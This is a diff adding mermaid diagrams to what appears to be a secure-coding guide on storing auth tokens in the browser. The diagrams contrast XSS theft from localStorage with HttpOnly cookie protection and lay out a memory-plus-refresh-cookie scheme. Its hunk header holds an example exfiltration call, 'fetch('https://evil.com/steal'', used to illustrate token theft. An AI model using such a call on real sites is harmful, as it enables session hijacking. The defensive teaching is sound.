@@ -72,3 +72,26 @@ await fetch('https://evil.com/steal', {
 
 // With HttpOnly cookie: this script cannot access the token at all.
 ```
+
+```mermaid
+flowchart TD
+    subgraph "localStorage (vulnerable)"
+        XSS["XSS payload injected"] -->|"localStorage.getItem('token')"| STEAL["Token stolen\nexfiltrated to attacker"]
+    end
+
+    subgraph "HttpOnly Cookie (safe)"
+        XSS2["XSS payload injected"] -->|"document.cookie → empty"| BLOCK["❌ JavaScript cannot\naccess HttpOnly cookie"]
+    end
+```
+
+## Recommended Token Storage — Summary
+
+```mermaid
+flowchart LR
+    AT["Access Token\n(short-lived, 15 min)"] -->|Store in| MEM["JS Memory\n(module variable)"]
+    RT["Refresh Token\n(long-lived, 7–30 days)"] -->|Store in| COOK["HttpOnly Secure\nSameSite=Lax Cookie"]
+
+    MEM -->|"Lost on page reload →"| REF["Silent refresh\ncall /auth/refresh\non page load"]
+    REF -->|Uses| COOK
+    COOK -->|Returns new| AT2["New access token\n→ back into memory"]
+```
